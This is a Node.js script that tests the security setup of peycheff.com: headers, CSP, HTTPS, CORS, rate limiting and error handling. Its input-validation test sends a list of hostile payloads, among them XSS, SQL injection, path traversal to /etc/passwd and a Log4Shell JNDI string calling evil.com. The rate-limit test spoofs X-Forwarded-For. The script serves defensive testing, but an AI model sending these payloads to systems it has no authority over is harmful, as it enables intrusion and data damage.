#!/usr/bin/env node

/**
 * Security Testing Script for peycheff.com
 * Tests various security implementations and configurations
 */

const https = require('https');
const crypto = require('crypto');

// Configuration
const BASE_URL = process.env.TEST_URL || 'https://peycheff.com';
const API_KEY = process.env.SECURITY_API_KEY;

// Test results
let testResults = {
  passed: 0,
  failed: 0,
  total: 0,
  details: []
};

// Utility functions
function log(message, type = 'INFO') {
  const timestamp = new Date().toISOString();
  console.log(`[${timestamp}] [${type}] ${message}`);
}

async function runTest(name, testFn) {
  testResults.total++;
  log(`Running test: ${name}`, 'TEST');

  try {
    const result = await testFn();
    if (result.passed) {
      testResults.passed++;
      log(`✅ PASSED: ${name} - ${result.message}`, 'PASS');
    } else {
      testResults.failed++;
      log(`❌ FAILED: ${name} - ${result.message}`, 'FAIL');
    }
    testResults.details.push({ name, ...result });
  } catch (error) {
    testResults.failed++;
    const message = `Test execution error: ${error.message}`;
    log(`❌ ERROR: ${name} - ${message}`, 'ERROR');
    testResults.details.push({ name, passed: false, message, error: error.message });
  }
}

// HTTP request helper
function makeRequest(url, options = {}) {
  return new Promise((resolve, reject) => {
    const req = https.request(url, options, (res) => {
      let data = '';
      res.on('data', (chunk) => data += chunk);
      res.on('end', () => resolve({
        statusCode: res.statusCode,
        headers: res.headers,
        body: data
      }));
    });

    req.on('error', reject);
    req.setTimeout(10000, () => {
      req.destroy();
      reject(new Error('Request timeout'));
    });

    if (options.body) {
      req.write(options.body);
    }
    req.end();
  });
}

// Security Tests

// 1. Test Security Headers
function testSecurityHeaders() {
  const requiredHeaders = [
    'x-content-type-options',
    'x-frame-options',
    'x-xss-protection',
    'strict-transport-security',
    'content-security-policy',
    'referrer-policy'
  ];

  const optionalHeaders = [
    'x-permitted-cross-domain-policies',
    'expect-ct',
    'permissions-policy'
  ];

  return makeRequest(BASE_URL).then(response => {
    const missingRequired = [];
    const missingOptional = [];
    const presentHeaders = [];

    requiredHeaders.forEach(header => {
      if (response.headers[header]) {
        presentHeaders.push(header);
      } else {
        missingRequired.push(header);
      }
    });

    optionalHeaders.forEach(header => {
      if (!response.headers[header]) {
        missingOptional.push(header);
      }
    });

    if (missingRequired.length === 0) {
      return {
        passed: true,
        message: `All required security headers present (${presentHeaders.join(', ')})`,
        details: {
          presentHeaders,
          missingOptional
        }
      };
    } else {
      return {
        passed: false,
        message: `Missing required security headers: ${missingRequired.join(', ')}`,
        details: {
          presentHeaders,
          missingRequired,
          missingOptional
        }
      };
    }
  });
}

// 2. Test CSP Configuration
function testCSPConfiguration() {
  return makeRequest(BASE_URL).then(response => {
    const cspHeader = response.headers['content-security-policy'];

    if (!cspHeader) {
      return {
        passed: false,
        message: 'Content Security Policy header missing'
      };
    }

    const cspDirectives = cspHeader.split(';').map(d => d.trim());
    const requiredDirectives = ['default-src', 'script-src', 'style-src', 'img-src'];
    const secureDirectives = ['object-src', 'base-uri', 'frame-ancestors'];

    const presentRequired = requiredDirectives.filter(dir =>
      cspDirectives.some(d => d.startsWith(dir))
    );

    const presentSecure = secureDirectives.filter(dir =>
      cspDirectives.some(d => d.startsWith(dir))
    );

    const hasUnsafeEval = cspDirectives.some(d =>
      d.includes('script-src') && d.includes("'unsafe-eval'")
    );

    const hasObjectSrcNone = cspDirectives.some(d =>
      d.includes('object-src') && d.includes("'none'")
    );

    const score = (presentRequired.length / requiredDirectives.length) * 50 +
                  (presentSecure.length / secureDirectives.length) * 30 +
                  (hasObjectSrcNone ? 20 : 0) -
                  (hasUnsafeEval ? 10 : 0);

    return {
      passed: score >= 70,
      message: `CSP Score: ${score}/100. Present directives: ${presentRequired.length}/${requiredDirectives.length} required, ${presentSecure.length}/${secureDirectives.length} secure`,
      details: {
        cspHeader,
        score,
        presentRequired,
        presentSecure,
        hasUnsafeEval,
        hasObjectSrcNone
      }
    };
  });
}

// 3. Test Rate Limiting
async function testRateLimiting() {
  const testUrl = `${BASE_URL}/api/contact`;
  const maxRequests = 10;
  const responses = [];

  // Make multiple requests quickly
  for (let i = 0; i < maxRequests; i++) {
    try {
      const response = await makeRequest(testUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Forwarded-For': `192.168.1.${i}`
        },
        body: JSON.stringify({
          name: 'Test User',
          email: 'test@example.com',
          message: 'This is a test message for rate limiting verification.'
        })
      });
      responses.push(response.statusCode);
    } catch (error) {
      responses.push('ERROR');
    }
  }

  const rateLimited = responses.some(code => code === 429);
  const allSuccessful = responses.every(code => code === 200);

  if (rateLimited) {
    return {
      passed: true,
      message: 'Rate limiting is working (received 429 status)',
      details: { responses, rateLimited: true }
    };
  } else if (allSuccessful) {
    return {
      passed: false,
      message: 'Rate limiting may not be configured properly (no 429 responses)',
      details: { responses, rateLimited: false }
    };
  } else {
    return {
      passed: true,
      message: 'API responding (may have other protections)',
      details: { responses }
    };
  }
}

// 4. Test Input Validation
async function testInputValidation() {
  const testUrl = `${BASE_URL}/api/contact`;
  const maliciousPayloads = [
    '<script>alert("xss")</script>',
    "'; DROP TABLE users; --",
    '../../../etc/passwd',
    '${jndi:ldap://evil.com/a}',
    '{{7*7}}',
    '<iframe src="javascript:alert(1)"></iframe>'
  ];

  const results = [];

  for (const payload of maliciousPayloads) {
    try {
      const response = await makeRequest(testUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Forwarded-For': `192.168.2.${Math.random() * 255}`
        },
        body: JSON.stringify({
          name: payload,
          email: 'test@example.com',
          message: `Test message with payload: ${payload}`
        })
      });

      results.push({
        payload,
        statusCode: response.statusCode,
        rejected: response.statusCode >= 400
      });
    } catch (error) {
      results.push({
        payload,
        statusCode: 'ERROR',
        rejected: true
      });
    }
  }

  const rejectedCount = results.filter(r => r.rejected).length;
  const rejectionRate = (rejectedCount / results.length) * 100;

  return {
    passed: rejectionRate >= 80,
    message: `Input validation rejection rate: ${rejectionRate}% (${rejectedCount}/${results.length})`,
    details: { results, rejectionRate }
  };
}

// 5. Test HTTPS Configuration
function testHTTPSConfiguration() {
  return makeRequest(BASE_URL).then(response => {
    const headers = response.headers;

    const checks = {
      hasHTTPS: BASE_URL.startsWith('https://'),
      hasHSTS: !!headers['strict-transport-security'],
      hstsIncludeSubdomains: headers['strict-transport-security']?.includes('includeSubDomains'),
      hstsPreload: headers['strict-transport-security']?.includes('preload'),
      hstsMaxAge: headers['strict-transport-security']?.match(/max-age=(\d+)/)?.[1] || 0
    };

    const score = Object.values(checks).filter(Boolean).length - 1; // Exclude hasHTTPS from score
    const maxScore = Object.keys(checks).length - 1;

    return {
      passed: checks.hasHTTPS && score >= 3,
      message: `HTTPS Configuration Score: ${score}/${maxScore}`,
      details: checks
    };
  });
}

// 6. Test Security Dashboard Access
async function testSecurityDashboard() {
  if (!API_KEY) {
    return {
      passed: false,
      message: 'SECURITY_API_KEY environment variable not set',
      details: { apiKeySet: false }
    };
  }

  try {
    const response = await makeRequest(`${BASE_URL}/api/security/stats`, {
      headers: {
        'X-API-Key': API_KEY
      }
    });

    const success = response.statusCode === 200;
    const hasData = response.body && response.body.includes('security');

    return {
      passed: success && hasData,
      message: success ?
        (hasData ? 'Security dashboard accessible with data' : 'Security dashboard accessible but no data') :
        `Security dashboard returned status ${response.statusCode}`,
      details: {
        statusCode: response.statusCode,
        hasData,
        apiKeySet: true
      }
    };
  } catch (error) {
    return {
      passed: false,
      message: `Security dashboard error: ${error.message}`,
      details: { apiKeySet: true, error: error.message }
    };
  }
}

// 7. Test CORS Configuration
async function testCORSConfiguration() {
  const origin = 'https://malicious-site.com';
  const testUrl = `${BASE_URL}/api/contact`;

  try {
    const response = await makeRequest(testUrl, {
      method: 'OPTIONS',
      headers: {
        'Origin': origin,
        'Access-Control-Request-Method': 'POST',
        'Access-Control-Request-Headers': 'Content-Type'
      }
    });

    const corsHeader = response.headers['access-control-allow-origin'];
    const allowedOrigin = corsHeader === origin || corsHeader === '*';

    return {
      passed: !allowedOrigin, // Should NOT allow malicious origins
      message: allowedOrigin ?
        'CORS allows external origins (potential security issue)' :
        'CORS properly restricts external origins',
      details: {
        corsHeader,
        testOrigin: origin,
        allowedOrigin
      }
    };
  } catch (error) {
    return {
      passed: true, // Error is better than allowing
      message: `CORS test resulted in error (likely safe): ${error.message}`,
      details: { error: error.message }
    };
  }
}

// 8. Test Error Handling
async function testErrorHandling() {
  const testCases = [
    { url: `${BASE_URL}/api/nonexistent`, method: 'GET' },
    { url: `${BASE_URL}/api/contact`, method: 'POST', body: 'invalid json' },
    { url: `${BASE_URL}/api/contact`, method: 'POST', body: '{}' }
  ];

  const results = [];

  for (const testCase of testCases) {
    try {
      const options = { method: testCase.method };
      if (testCase.body) {
        options.headers = { 'Content-Type': 'application/json' };
        options.body = testCase.body;
      }

      const response = await makeRequest(testCase.url, options);

      const safeError = response.statusCode >= 400 && response.statusCode < 500;
      const noStackTrace = !response.body || !response.body.includes('at ') || !response.body.includes('node_modules');

      results.push({
        url: testCase.url,
        method: testCase.method,
        statusCode: response.statusCode,
        safeError,
        noStackTrace,
        secure: safeError && noStackTrace
      });
    } catch (error) {
      results.push({
        url: testCase.url,
        method: testCase.method,
        statusCode: 'ERROR',
        secure: true // Network errors are generally safe
      });
    }
  }

  const secureCount = results.filter(r => r.secure).length;
  const securityScore = (secureCount / results.length) * 100;

  return {
    passed: securityScore >= 80,
    message: `Error handling security score: ${securityScore}% (${secureCount}/${results.length} responses secure)`,
    details: { results, securityScore }
  };
}

// Main execution
async function runSecurityTests() {
  log('🔒 Starting Security Tests for peycheff.com', 'INFO');
  log(`Target: ${BASE_URL}`, 'INFO');
  log('='.repeat(60), 'INFO');

  // Run all tests
  await runTest('Security Headers', testSecurityHeaders);
  await runTest('CSP Configuration', testCSPConfiguration);
  await runTest('Rate Limiting', testRateLimiting);
  await runTest('Input Validation', testInputValidation);
  await runTest('HTTPS Configuration', testHTTPSConfiguration);
  await runTest('Security Dashboard Access', testSecurityDashboard);
  await runTest('CORS Configuration', testCORSConfiguration);
  await runTest('Error Handling', testErrorHandling);

  // Results summary
  log('='.repeat(60), 'INFO');
  log('🏁 Security Tests Complete', 'INFO');
  log(`Total Tests: ${testResults.total}`, 'INFO');
  log(`Passed: ${testResults.passed}`, 'INFO');
  log(`Failed: ${testResults.failed}`, 'INFO');

  const successRate = (testResults.passed / testResults.total) * 100;
  log(`Success Rate: ${successRate.toFixed(1)}%`, 'INFO');

  if (testResults.failed > 0) {
    log('\n❌ Failed Tests:', 'WARN');
    testResults.details
      .filter(test => !test.passed)
      .forEach(test => {
        log(`  - ${test.name}: ${test.message}`, 'WARN');
      });
  }

  log('\n📊 Detailed Results:', 'INFO');
  console.log(JSON.stringify(testResults.details, null, 2));

  // Exit with appropriate code
  process.exit(testResults.failed > 0 ? 1 : 0);
}

// Run if called directly
if (require.main === module) {
  runSecurityTests().catch(error => {
    log(`Test suite error: ${error.message}`, 'ERROR');
    process.exit(1);
  });
}

module.exports = {
  runSecurityTests,
  testSecurityHeaders,
  testCSPConfiguration,
  testRateLimiting,
  testInputValidation,
  testHTTPSConfiguration,
  testSecurityDashboard,
  testCORSConfiguration,
  testErrorHandling
};